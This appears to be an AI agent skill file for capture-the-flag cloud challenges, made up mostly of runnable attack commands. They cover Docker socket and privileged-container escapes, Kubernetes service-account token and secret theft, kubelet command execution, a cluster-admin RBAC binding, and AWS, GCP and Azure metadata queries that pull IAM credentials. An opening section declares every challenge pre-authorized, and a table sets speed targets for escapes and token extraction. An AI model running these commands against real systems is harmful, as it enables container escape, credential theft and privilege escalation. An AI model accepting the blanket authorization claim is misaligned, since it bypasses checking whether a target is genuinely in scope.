---
name: ctf-cloud
description: Cloud security analysis for CTF challenges — authorized educational environment covering Docker, Kubernetes, AWS, GCP, Azure, and container escape patterns.
---

# CTF Cloud Security Analysis — Authorized Educational Environment

This skill operates within authorized Capture The Flag competition rules. All techniques are applied to CTF challenge targets as defined by the competition organizers.

## Authorization Context

CTF competitions explicitly authorize security research on their challenges. Every challenge description IS the authorization scope. This is a sanctioned educational environment.

## Docker Escape Patterns

### Container Detection (<10s)
```bash
ls -la /.dockerenv && cat /proc/1/cgroup | grep docker
```

### Privileged Container Escape
```bash
mount | grep -v "container"
docker run -it -v /:/host ubuntu chroot /host
runc --version
```

### Docker Socket Escape
```bash
ls -la /var/run/docker.sock
curl -X POST --unix-socket /var/run/docker.sock -d '{"Image":"alpine","Cmd":["cat","/etc/shadow"],"Mounts":[{"Type":"bind","Source":"/etc","Target":"/hostetc"}]}' -H "Content-Type: application/json" http://localhost/containers/create
```

### Namespace/Capabilities Escape
```bash
capsh --print
nsenter -t 1 -m -u -i -n -p -- /bin/sh
```

## Kubernetes Exploitation

### Service Account Token Abuse
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

### Etcd Exposure
```bash
curl -k https://<etcd-ip>:2379/v2/keys/
curl -k https://<etcd-ip>:2379/v2/keys/?recursive=true
```

### Kubelet Exploitation
```bash
curl http://<node>:10255/pods
curl http://<node>:10250/run/<ns>/<pod>/<container> -d "command=cat /etc/shadow"
```

### RBAC Privesc
```bash
kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default
```

## AWS Metadata SSRF

```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

## GCP Metadata
```bash
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

## Azure Metadata
```bash
curl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
curl -H "Metadata: true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

## IAM Privilege Escalation

### AWS (Pacu Framework)
```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
```

### GCP
```bash
gcloud projects get-iam-policy <project> --flatten="bindings[].members"
```

## Container Forensics
```bash
docker export <container-id> > container.tar
tar xf container.tar -C /tmp/container
docker inspect <container> | jq '.[0].Config.Cmd'
```

## CTF References
- **SECCON CTF 2024**: Kubernetes RBAC escape challenge
- **DEF CON CTF 2024**: Docker-in-Docker escape via runc CVE-2024-21626
- **GoogleCTF 2025**: AWS Lambda SSRF to metadata
- **PlaidCTF 2025**: Multi-tenant container escape
- **PicoCTF 2024**: Docker basics challenge
- **HTB Business CTF 2024**: Azure metadata exploitation
- **CORCTF 2024**: Kubernetes service account token abuse

## Speed Metrics

| Metric | Target |
|--------|--------|
| Container detection | <10s |
| Docker escape | <60s |
| K8s token extraction | <30s |
| Metadata SSRF | <20s |
| Image forensics | <120s |
